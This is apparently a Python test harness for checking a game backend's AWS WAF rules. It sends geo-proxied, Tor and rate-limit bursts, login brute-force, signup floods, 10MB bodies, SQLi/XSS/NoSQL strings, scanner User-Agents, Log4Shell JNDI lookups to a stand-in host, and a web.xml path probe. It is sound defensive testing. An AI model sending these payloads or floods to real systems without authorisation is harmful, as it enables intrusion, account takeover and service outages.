# ==========================================
# 🛡️ Vamserlike WAF 보안 테스트 툴 (Storytelling & 팀원 친화적 주석 버전)
# ==========================================
# "WAF 보안 테스트 시나리오 명세서 (v11)"의 10개 케이스를 단독 검증합니다.
#
# 실행 방법:
#   set WAF_TARGET_URL=http://<alb-dns>
#   set TOR_SOCKS=socks5h://127.0.0.1:9150
#   set PROXY_IN=socks5h://127.0.0.1:1080
#   python waf_security_test.py
# ==========================================

import os
import sys
import time
import random
import string
from pathlib import Path
from dataclasses import dataclass, field
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

# 부모 폴더(루트)의 config.py 경로 추가 및 로드
_ROOT = str(Path(__file__).resolve().parent.parent)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

try:
    from config import BASE_URL, TEST_PW, UNLOCK_TARGET_CHARACTER_ID
except ImportError:
    BASE_URL = os.environ.get("BASE_URL", "http://localhost:5159")
    TEST_PW = os.environ.get("TEST_PW", "Password123!")
    UNLOCK_TARGET_CHARACTER_ID = os.environ.get("UNLOCK_TARGET_CHARACTER_ID", "potato_farmer")

# ------------------------------------------
# 환경 변수 및 설정
# ------------------------------------------
WAF_TARGET_URL = os.environ.get("WAF_TARGET_URL", BASE_URL).rstrip("/")

PROXIES_GEO = {
    "인도": os.environ.get("PROXY_IN"),
    "남아프리카": os.environ.get("PROXY_ZA"),
    "싱가포르": os.environ.get("PROXY_SG"),
}
TOR_SOCKS = os.environ.get("TOR_SOCKS")
# Case 9·10 분리 검증용: 허용국(일본/미국) 출구 프록시.
#  - Case 9 : Geo 통과 후 AnonymousIpList'만'으로 차단되는지 검증.
#  - Case 10: 로컬 백신(DPI) 우회 + Geo 통과 → case10-log4j-jndi가 직접 차단되는지 검증.
# 예) 일본 Tor 출구: torrc에 'ExitNodes {jp}' + 'StrictNodes 1' 후  set PROXY_ANON=socks5h://127.0.0.1:9150
#     또는 도쿄 EC2 SSH 터널:                            set PROXY_ANON=socks5h://127.0.0.1:1085
PROXY_ANON = os.environ.get("PROXY_ANON")

REQ_TIMEOUT = 10
WAF_BLOCK_CODE = 403
BLOCK_HEADER = "x-waf-rule"

# 속도 규칙 폴링 파라미터 기본값
RATE_BURST = int(os.environ.get("RATE_BURST", "150"))
RATE_POLL_SECONDS = int(os.environ.get("RATE_POLL_SECONDS", "120"))
RATE_PROBE_INTERVAL = 5
RATE_REQ_TIMEOUT = int(os.environ.get("RATE_REQ_TIMEOUT", "5"))
RATE_WORKERS = int(os.environ.get("RATE_WORKERS", "1"))  # 1=단일 연결(같은 IP 보장, NAT풀에서도 동작/권장). >1=병렬(단일 공인 IP망에서만)


# ==========================================
# 유틸리티 및 결과 수집기
# ==========================================
def _rule_label(rule):
    return rule if rule else "(관리형 룰셋)"

@dataclass
class WafReport:
    results: list = field(default_factory=list)

    def record(self, name, status, detail=""):
        icon = {"PASS": "🟢", "FAIL": "🔴", "SKIP": "🟡"}.get(status, "⚪")
        print(f"  {icon} {status:<4} │ {name}")
        if detail:
            print(f"            │ → {detail}")
        self.results.append((name, status))

    def summary(self):
        total = len(self.results)
        passed = sum(1 for _, s in self.results if s == "PASS")
        failed = sum(1 for _, s in self.results if s == "FAIL")
        skipped = sum(1 for _, s in self.results if s == "SKIP")
        print("\n" + "=" * 60)
        print("📋 WAF 보안 테스트 결과 요약")
        print("=" * 60)
        for name, s in self.results:
            mark = {"PASS": "✅", "FAIL": "❌", "SKIP": "⏭️"}.get(s, "•")
            print(f"  {mark} {name}")
        print("-" * 60)
        print(f"  합계 {total} │ 차단 확인(PASS) {passed} │ 미차단(FAIL) {failed} │ 건너뜀(SKIP) {skipped}")
        print("=" * 60)
        return failed == 0

def _rand_email(prefix="waf"):
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}@test.com"

def get_token():
    try:
        res = requests.post(
            f"{WAF_TARGET_URL}/api/dev/bypass-login",
            json={"email": _rand_email("waf_setup"), "password": TEST_PW, "nickname": "waf_tester"},
            timeout=REQ_TIMEOUT,
        )
        if res.status_code != 200:
            return None
        body = res.json()
        data = body.get("data", body) if isinstance(body, dict) else {}
        auth = data.get("auth", {}) if isinstance(data, dict) else {}
        return auth.get("idToken")
    except Exception:
        return None

# ==========================================
# 네트워크 전송 헬퍼
# ==========================================
def send_until_blocked(method, path, max_count, *, headers=None, json_body=None,
                       data=None, params=None, proxies=None):
    """지정된 횟수만큼 요청을 보내고, 403(차단)을 만나면 즉시 중단 후 결과를 반환합니다.
       반환값: (차단여부: bool, 전송건수: int, 차단한규칙이름: str)"""
    sent = 0
    for _ in range(max_count):
        sent += 1
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, params=params,
                proxies=proxies, timeout=REQ_TIMEOUT,
            )
        except Exception:
            continue
        if resp.status_code == WAF_BLOCK_CODE:
            return True, sent, resp.headers.get(BLOCK_HEADER)
    return False, sent, None

def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=None,
                              data=None, workers=20):
    """다수의 요청을 병렬(멀티스레드)로 동시에 쏟아부어 차단 여부를 검사합니다. (Case 5 대용량 페이로드 용도)
       반환값: (차단여부: bool, 차단한규칙이름: str)"""
    def _one(_):
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, timeout=REQ_TIMEOUT,
            )
            return resp.status_code, resp.headers.get(BLOCK_HEADER)
        except Exception:
            return None, None

    blocked = False
    rule = None
    # ThreadPoolExecutor를 사용해 workers 개수만큼의 스레드로 동시 타격
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_one, i) for i in range(count)]
        for f in as_completed(futures):
            code, r = f.result()
            if code == WAF_BLOCK_CODE:
                blocked = True
                rule = r or rule
    return blocked, rule

def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
    """단일 연결 버스트 후 WAF 지연 반영 폴링(대기)을 수행합니다."""
    # 명세서에서 지정한 건수(burst_count)가 있으면 적용, 없으면 기본값(150) 사용
    target_burst = burst_count if burst_count else RATE_BURST

    responded = 0
    server_errors = 0
    blocked = False
    block_rule = None
    codes = Counter()

    def _account(code, rule):
        nonlocal responded, server_errors, blocked, block_rule
        if code is None:
            return
        responded += 1
        codes[code] += 1
        if code == WAF_BLOCK_CODE:
            blocked = True
            block_rule = rule or block_rule
        elif code >= 500:
            server_errors += 1

    if RATE_WORKERS <= 1:
        # Session()을 사용하면 TCP 커넥션(Keep-Alive)이 하나로 유지되어, 
        # NAT망(공유기 등) 환경에서도 WAF가 동일한 출발지 IP로 인식하게 강제합니다 (단일 IP 보장)
        sess = requests.Session()
        for _ in range(target_burst):
            try:
                r = sess.request(method, f"{WAF_TARGET_URL}{path}",
                                 headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
                _account(r.status_code, r.headers.get(BLOCK_HEADER))
            except Exception:
                pass
        sess.close()
    else:
        # 단일 공인 IP망이 확실할 때, 여러 스레드로 전송 속도를 높이기 위한 분기
        def _one(_):
            try:
                r = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                     headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
                return r.status_code, r.headers.get(BLOCK_HEADER)
            except Exception:
                return None, None
        with ThreadPoolExecutor(max_workers=RATE_WORKERS) as ex:
            for code, rule in ex.map(_one, range(target_burst)):
                _account(code, rule)

    failed = target_burst - responded
    print(f"    📡 트래픽 {target_burst}건 전송 완료 (응답 {responded}, 실패 {failed})")

    if blocked:
        return True, block_rule, f"약 0초 뒤 차단 성공"
    if responded == 0:
        return False, None, "대상에 연결 불가 — 폴링 생략"
    if responded < target_burst * 0.5:
        return False, None, f"응답 {responded}/{target_burst} — 요청 상당수 실패(네트워크 점검), 폴링 생략"
    if server_errors >= responded * 0.8:
        return False, None, f"응답 대부분이 5xx({server_errors}/{responded}) — 백엔드 점검 필요, 폴링 생략"

    # WAF 속도 제한 정책(Rate Limit)은 임계치를 넘겨도 실제 차단까지 수 초~수십 초가 걸리므로 폴링하며 기다립니다
    print(f"    ⏳ WAF 규칙 평가 및 차단 대기 중 (최대 {RATE_POLL_SECONDS}초 폴링)")
    deadline = time.time() + RATE_POLL_SECONDS
    while time.time() < deadline:
        time.sleep(RATE_PROBE_INTERVAL)
        try:
            resp = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                    headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
            if resp.status_code == WAF_BLOCK_CODE:
                waited = int(RATE_POLL_SECONDS - (deadline - time.time()))
                return True, resp.headers.get(BLOCK_HEADER), f"약 {waited}초 뒤 차단 성공"
        except Exception:
            pass
    return False, None, f"{RATE_POLL_SECONDS}초 내 미차단"

# ==========================================
# 테스트 케이스 1 ~ 10
# ==========================================
def case_01_geo(report):
    print("\n" + "=" * 55)
    print("[Case 1] 지역 기반 비정상 접근 (서비스 대상국 외 차단)")
    print(" 🎯 목적: 해외 프록시를 경유한 대량 봇 접근 및 파밍 시도 방어")
    print(" 🛡️ 방어: Geo Match (한국, 미국, 일본 외 국가 차단)")
    print("-" * 55)

    try:
        # 서비스 허용 국가(본인 IP)에서 보낸 요청은 차단(403)되지 않고 통과하는지 확인
        resp = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
        allowed_ok = resp.status_code != WAF_BLOCK_CODE
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "PASS" if allowed_ok else "FAIL",
                      f"본인 IP → /api/health {resp.status_code} (403이 아니어야 정상)")
    except Exception as e:
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "SKIP", f"요청 실패: {e}")

    configured = {k: v for k, v in PROXIES_GEO.items() if v}
    if not configured:
        report.record("Case 1. 서비스 대상국 외 차단", "SKIP",
                      "PROXY_IN(인도 VM SSH SOCKS 터널) 미설정 — 비허용국 출처 필요")
        return

    all_blocked = True
    last_rule = None
    for country, proxy in configured.items():
        # requests의 표준 기능. 우리의 진짜 IP 대신 지정된 해외 프록시 IP를 달고 나가도록 세팅
        proxies = {"http": proxy, "https": proxy}
        
        print(f" 🚀 [공격] {country} IP로 우회하여 /api/health 타격")
        # b: 차단여부(bool), sent: 전송건수(int), rule: 차단한 규칙이름(str)
        blocked, sent, rule = send_until_blocked("GET", "/api/health", 50, proxies=proxies)
        tag = f" (규칙: {_rule_label(rule)})" if blocked else ""
        print(f"    📡 트래픽 {sent}건 전송 완료 -> {'차단됨' if blocked else '통과됨(미차단)'}{tag}")
        
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule

    report.record("Case 1. 서비스 대상국 외 차단", "PASS" if all_blocked else "FAIL",
                  f"→ 차단 성공 (작동 규칙: {_rule_label(last_rule)})" if all_blocked else "")


def case_02_rate(report, token):
    print("\n" + "=" * 55)
    print("[Case 2] 랭킹 및 캐릭터 해금 API 반복 호출")
    print(" 🎯 목적: 매크로를 이용한 비정상적인 데이터 조회 및 서버 부하 유도 방어")
    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
    print("-" * 55)
    
    headers = {"Authorization": f"Bearer {token}"} if token else None

    print(" 🚀 [공격 1] 랭킹 조회 반복 요청")
    print("    - 대상: GET /api/players/ranking")
    print("    - 방식: 단시간에 200건의 트래픽 버스트 전송 (Locust 모사)")
    
    # 랭킹 조회 API에 단시간 내 임계치(100회)를 초과하는 반복 요청 전송 및 지연 차단 대기(Polling)
    blocked, rule, info = rate_test("GET", "/api/players/ranking?take=20", headers=headers, burst_count=200)
    report.record("Case 2-1. 랭킹 조회 속도 제한", "PASS" if blocked else "FAIL",
                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)

    print("\n 🚀 [공격 2] 캐릭터 해금 반복 요청")
    print("    - 대상: PUT /api/players/me/characters/unlock")
    print("    - 방식: 단시간에 150건의 병렬 트래픽 전송 (concurrent 모사)")
    
    # 캐릭터 해금 API에 단시간 내 임계치(100회)를 초과하는 반복 요청 전송
    blocked, rule, info = rate_test("PUT", "/api/players/me/characters/unlock",
                                    headers=headers, json_body={"characterId": UNLOCK_TARGET_CHARACTER_ID},
                                    burst_count=150)
    report.record("Case 2-2. 캐릭터 해금 속도 제한", "PASS" if blocked else "FAIL",
                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)


def case_03_rate_progress(report, token):
    print("\n" + "=" * 55)
    print("[Case 3] 게임 결과 저장 API 반복 전송")
    print(" 🎯 목적: 비정상적으로 짧은 시간 안에 재화를 무한 복사하는 핵 유저 차단")
    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
    print("-" * 55)

    headers = {"Authorization": f"Bearer {token}"} if token else None
    payload = {"score": 1500, "level": 10, "playedCharacterId": "rice_farmer"}
    
    print(" 🚀 [공격] 자동화 스크립트를 통한 300건의 게임 클리어 신호 전송")
    print("    - 대상: PUT /api/players/me/progress")
    
    # 명세서 반영: 300건의 대량 요청 전송
    blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload, burst_count=300)
    report.record("Case 3. 결과 저장 속도 제한", "PASS" if blocked else "FAIL",
                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)


def case_04_injection(report):
    print("\n" + "=" * 55)
    print("[Case 4] 악성 패턴 주입 (SQLi / XSS / NoSQL)")
    print(" 🎯 목적: 비정상적인 데이터베이스 파괴 및 타 유저 정보 탈취 공격 방어")
    print(" 🛡️ 방어: AWS 공통 관리형 룰셋(CommonRuleSet) & SQLiRuleSet 작동 확인")
    print("-" * 55)

    payloads = [
        "' OR 1=1 --",
        "; DROP TABLE Users --",
        "<script>document.cookie</script>",
        "<img onerror=alert(1)>",
    ]
    nosql_payloads = ['{"$gt": ""}', '{"$ne": null}']

    print(" 🚀 [공격 1] 전통적인 공격 패턴 전송 (SQLi / XSS)")
    blocked_all = True
    for p in payloads:
        # 테스트 툴이 로그인 API(POST)와 랭킹 조회 API(GET) 양쪽에 악성 페이로드를 삽입해 전송해 봄
        # 반환값 -> b1, b2: 차단 여부(bool) / _: 전송건수(여기선 무시) / r1, r2: 차단한 WAF 규칙
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1, json_body={"email": p, "password": p})
        b2, _, r2 = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        
        # 둘 중 하나라도 차단(True)되면 방어에 성공한 것(hit)으로 간주함
        hit = b1 or b2
        rule = r1 or r2
        tag = f" (규칙: {_rule_label(rule)})" if hit else ""
        print(f"    - {p[:30]!r} : {'차단 성공' if hit else '통과됨(위험)'}{tag}")
        blocked_all = blocked_all and hit
    report.record("Case 4-1. SQLi/XSS 패턴 차단", "PASS" if blocked_all else "FAIL", "→ 기초 웹 해킹 패턴 방어 성공")

    print("\n 🚀 [공격 2] 최신 데이터베이스 공격 패턴 전송 (NoSQL)")
    nosql_blocked = 0
    for p in nosql_payloads:
        # NoSQL 패턴 커버리지 확인을 위한 실측용 전송 (기본 룰셋이 못 막는 경우가 있어 실패로 간주하지 않음)
        b, _, _ = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        if b:
            nosql_blocked += 1
    report.record("Case 4-2. NoSQL 패턴 차단 범위(실측)", "PASS",
                  f"→ {nosql_blocked}/{len(nosql_payloads)}건 차단 (한계 범위 실측 완료)")


def case_05_size(report):
    print("\n" + "=" * 55)
    print("[Case 5] 대용량 페이로드를 통한 서버 리소스 고갈")
    print(" 🎯 목적: 10MB 이상의 쓰레기 데이터를 던져 백엔드 서버를 뻗게 만드는 공격 방어")
    print(" 🛡️ 방어: Size Constraint Rule (요청 바디 8KB 초과 시 즉시 차단)")
    print("-" * 55)

    BURST = int(os.environ.get("SIZE_TEST_BURST", "5"))
    print(f" 🚀 [공격] 10MB 크기의 더미 데이터를 {BURST}건 동시 전송")
    
    # 10MB 크기의 더미 데이터를 생성하여 WAF 바디 크기 제한(8KB) 초과 유도
    big_body = "A" * (10 * 1024 * 1024)
    
    # 해당 대용량 페이로드를 멀티스레드를 이용해 여러 개(workers)를 한 번에 쏟아부음
    blocked, rule = send_parallel_any_blocked("POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
    report.record("Case 5. 8KB 초과 요청 차단", "PASS" if blocked else "FAIL",
                  f"→ 백엔드 도달 전 방어 완료 (작동 규칙: {_rule_label(rule)})" if blocked else f"10MB × {BURST}건 전송됨(위험)")


def case_06_login_bruteforce(report):
    print("\n" + "=" * 55)
    print("[Case 6] 로그인 무차별 대입 공격 (Brute-force)")
    print(" 🎯 목적: 타인의 계정을 탈취하기 위해 비밀번호를 대량으로 찍어보는 공격 방어")
    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
    print("-" * 55)

    print(" 🚀 [공격] 로그인 API에 500건의 무차별 대입 시도")
    # 명세서 반영: 500건 대입 전송
    blocked, rule, info = rate_test("POST", "/api/Auth/login",
                                    json_body={"email": "brute@test.com", "password": "wrongpw"},
                                    burst_count=500)
    report.record("Case 6. 로그인 속도 제한", "PASS" if blocked else "FAIL",
                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)


def case_07_signup_flood(report):
    print("\n" + "=" * 55)
    print("[Case 7] 계정 대량 생성 공격 (Account Takeover / Bot)")
    print(" 🎯 목적: 봇을 이용해 작업장 계정을 무한 생성하는 어뷰징 시도 방어")
    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
    print("-" * 55)

    print(" 🚀 [공격] 무작위 이메일을 담아 200건의 회원가입 요청 전송")
    # 명세서 반영: 200건 대량 전송
    blocked, rule, info = rate_test("POST", "/api/Auth/signup",
                                    json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"},
                                    burst_count=200)
    report.record("Case 7. 회원가입 속도 제한", "PASS" if blocked else "FAIL",
                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)


def case_08_user_agent(report):
    print("\n" + "=" * 55)
    print("[Case 8] 자동화 도구 및 해킹 스캐너 차단")
    print(" 🎯 목적: 자동화 스크립트로 서버의 취약점을 스캔하거나 긁어가는 행위 방어")
    print(" 🛡️ 방어: String Match Rule (User-Agent 헤더 기반 차단)")
    print("-" * 55)

    user_agents = ["sqlmap/1.0", "Nikto/2.5", "zgrab/0.1", "Selenium/4.0", "Puppeteer/20.0"]
    all_blocked = True
    last_rule = None
    
    print(" 🚀 [공격] 헤더를 봇(Bot) 이름으로 위장하여 서버 접근 시도")
    for ua in user_agents:
        # HTTP 헤더의 User-Agent를 해킹 스캐너/자동화 봇 이름으로 변조하여 전송
        blocked, _, rule = send_until_blocked("GET", "/api/players/ranking", 1, headers={"User-Agent": ua}, params={"take": 20})
        tag = f" (규칙: {_rule_label(rule)})" if blocked else ""
        print(f"    - {ua} : {'차단 성공' if blocked else '통과됨(위험)'}{tag}")
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule

    report.record("Case 8. 도구 User-Agent 차단", "PASS" if all_blocked else "FAIL",
                  f"→ 봇 탐지 방어 성공 (작동 규칙: {_rule_label(last_rule)})" if all_blocked else "")


def case_09_anonymous_ip(report):
    print("\n" + "=" * 55)
    print("[Case 9] 익명 IP 및 Tor 프록시 차단")
    print(" 🎯 목적: 추적을 피하기 위해 다크웹(Tor)이나 VPN을 경유한 공격자의 접근 차단")
    print(" 🛡️ 방어: AWS 익명 IP 관리형 룰셋(AnonymousIpList) 작동 확인")
    print("-" * 55)

    # 허용국(JP/US) 익명 출구(PROXY_ANON)가 있으면 우선 사용한다.
    # 이 경로는 Geo(허용국이라 통과)를 지나 AnonymousIpList'만'으로 차단되는지 분리 검증한다.
    # 없으면 기존 TOR_SOCKS(Tor가 고르는 출구; 비허용국이면 Geo가 먼저 막음)로 대체.
    anon_proxy = PROXY_ANON or TOR_SOCKS
    via = "PROXY_ANON(허용국 익명 출구)" if PROXY_ANON else "TOR_SOCKS(Tor 출구)"
    if not anon_proxy:
        report.record("Case 9. Tor/익명 IP 차단", "SKIP",
                      "PROXY_ANON / TOR_SOCKS 미설정 — 익명 출구 프록시 필요")
        return

    proxies = {"http": anon_proxy, "https": anon_proxy}

    print(f" 🚀 [공격] {via} 경유로 50건의 익명 요청 전송")
    blocked, sent, rule = send_until_blocked("GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)

    if not blocked:
        report.record("Case 9. Tor/익명 IP 차단", "FAIL",
                      f"{sent}건 미차단 — 출구 IP가 AnonymousIpList에 없을 수 있음 "
                      "(일본 Tor 출구 권장: torrc에 ExitNodes {jp} / StrictNodes 1)")
        return
    if rule == "case1-geo-allowlist":
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      "→ Geo가 먼저 차단(출구가 비허용국). AnonymousIpList 단독 검증은 "
                      "허용국(일본/미국) 익명 출구를 PROXY_ANON으로 지정하세요")
    elif rule:
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      f"→ 차단 성공 (규칙: {rule}, 전송 {sent}건)")
    else:
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      f"→ AnonymousIpList 단독 차단 확인 — 허용국 익명 IP 차단 검증 완료 (전송 {sent}건)")


def case_10_known_bad_inputs(report):
    print("\n" + "=" * 55)
    print("[Case 10] 알려진 취약점 공격 패턴 차단")
    print(" 🎯 목적: Log4j처럼 이미 전 세계적으로 유명한 악성 해킹 코드의 원천 차단")
    print(" 🛡️ 방어: AWS 알려진 악성 입력 관리형 룰셋(KnownBadInputsRuleSet) 작동 확인")
    print("-" * 55)

    log4j = ["${jndi:ldap://malicious-test.com/a}", "${jndi:rmi://malicious-test.com/b}"]
    all_blocked = True
    rules_seen = set()  # 어떤 규칙이 막았는지 수집 (커스텀 헤더가 있을 때만)

    # 허용국(JP/US) 출구(PROXY_ANON)가 있으면 우선 사용:
    #   로컬 백신(DPI) 우회(암호화 터널) + Geo 통과(허용국) → case10-log4j-jndi가 '직접' 차단되는지 검증.
    # 없으면 인도/Tor로 대체(비허용국이면 Geo가 먼저 막아 'Geo 그림자'가 됨).
    proxy_url = PROXY_ANON or PROXIES_GEO.get("인도") or TOR_SOCKS
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    via = "PROXY_ANON(허용국 출구)" if PROXY_ANON else ("인도/Tor 출구" if proxy_url else "직접(프록시 없음)")
    print(f" 🛰️ 전송 경로: {via}")

    print(" 🚀 [공격 1] 역사상 최악의 취약점(Log4Shell) 마법의 주문 전송")
    for p in log4j:
        # PC 로컬 백신의 개입(네트워크 전송 전 차단)을 막기 위해 프록시 터널을 경유하여 Log4j 악성 패턴 주입
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                       headers={"X-Test-Payload": p},
                                       json_body={"email": "a@test.com", "password": p},
                                       proxies=proxies)
        if b1 and r1:
            rules_seen.add(r1)
        tag = f" (규칙: {_rule_label(r1)})" if b1 else ""
        print(f"    - {p[:40]!r} : {'차단 성공' if b1 else '통과됨(위험)'}{tag}")
        all_blocked = all_blocked and b1

    print("\n 🚀 [공격 2] 서버 1급 기밀문서(설정 파일) 내놓으라고 억지 부리기")
    # 노출되면 안 되는 알려진 내부 경로(web.xml 등) 접근 시도 전송
    b_path, _, r_path = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies)
    if b_path and r_path:
        rules_seen.add(r_path)
    print(f"    - /web-inf/web.xml : {'차단 성공' if b_path else '통과됨(위험)'}")
    all_blocked = all_blocked and b_path

    # 결과 해석: 어떤 규칙이 막았는가로 '깨끗한 검증'인지 'Geo 그림자'인지 구분
    if not all_blocked:
        report.record("Case 10. 알려진 악성 입력 차단", "FAIL",
                      "일부 미차단 — 로컬 백신이 패킷을 가로챘거나(허용국 출구 PROXY_ANON 권장) 규칙 미작동")
    elif "case10-log4j-jndi" in rules_seen:
        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
                      f"→ Log4j 전용 규칙 직접 차단 검증 완료 (작동 규칙: {', '.join(sorted(rules_seen))})")
    elif rules_seen == {"case1-geo-allowlist"}:
        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
                      "→ Geo가 먼저 차단(비허용국 출구). Log4j 규칙 분리 검증은 허용국 출구(PROXY_ANON) 사용")
    else:
        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
                      "→ 관리형 KnownBadInputs 등으로 차단 (전 세계구급 해킹 패턴 방어 성공)")

# ==========================================
# 사전 검증 및 메인 로직
# ==========================================
def _egress_ip_probe(n=12):
    endpoints = ["https://checkip.amazonaws.com", "https://api.ipify.org"]
    def _ip(i):
        try:
            r = requests.get(endpoints[i % len(endpoints)], timeout=5)
            return r.text.strip()
        except Exception:
            return None

    ips = set()
    try:
        with ThreadPoolExecutor(max_workers=n) as ex:
            for ip in ex.map(_ip, range(n)):
                if ip:
                    ips.add(ip)
    except Exception:
        pass
    return ips

def preflight_check():
    try:
        r = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print("\n❌ 대상에 연결할 수 없습니다:", WAF_TARGET_URL)
        print("   이 세션에 WAF_TARGET_URL 환경변수가 설정됐는지 확인하세요.")
        print(f"   상세: {type(e).__name__}")
        return False
    if r.status_code >= 500:
        print(f"\n⚠️  백엔드 헬스체크가 {r.status_code} 입니다 — ALB 뒤 백엔드가 비정상/다운일 수 있습니다.")
        print("    속도(rate) 케이스는 요청이 5xx로 느리게 처리되어 부정확해집니다.")
    return True

def run_all() -> bool:
    print("=" * 60)
    print("🛡️ Vamserlike WAF 보안 테스트 툴 (Jang Bros)")
    print(f"🎯 WAF 테스트 대상: {WAF_TARGET_URL}")
    if WAF_TARGET_URL == BASE_URL:
        print("⚠️  WAF_TARGET_URL이 BASE_URL과 동일합니다. ALB(WAF) 주소인지 확인하세요.")
    print("ℹ️  속도 규칙은 IP당 5분 100회 기준이라, 직전 실행으로 IP가 차단된 상태면")
    print("    결과가 왜곡됩니다. 약 5분 경과 후 1회 실행을 권장합니다.")
    print("=" * 60)

    if not preflight_check():
        return False

    egress = _egress_ip_probe()
    if len(egress) > 1:
        print(f"\n⚠️  출발 공인 IP가 여러 개로 보입니다: {sorted(egress)}")
        print("    NAT 풀/CGNAT 환경일 수 있어 속도 케이스 검증 시 오탐이 날 수 있습니다.")
    elif len(egress) == 1:
        print(f"ℹ️  출발 공인 IP: {next(iter(egress))} (단일 IP망 — 속도 규칙 검증에 적합)")

    report = WafReport()
    token = get_token()
    if not token:
        print("ℹ️  인증 토큰 미확보 — 토큰이 필요한 케이스는 401을 거쳐 속도 규칙을 검증합니다.")

    case_01_geo(report)
    case_02_rate(report, token)
    case_03_rate_progress(report, token)
    case_04_injection(report)
    case_05_size(report)
    case_06_login_bruteforce(report)
    case_07_signup_flood(report)
    case_08_user_agent(report)
    case_09_anonymous_ip(report)
    case_10_known_bad_inputs(report)

    return report.summary()

if __name__ == "__main__":
    try:
        ok = run_all()
        if "--ci" in sys.argv:
            sys.exit(0 if ok else 1)
    except KeyboardInterrupt:
        print("\n👋 사용자에 의해 테스트가 중단되었습니다.")
        sys.exit(1)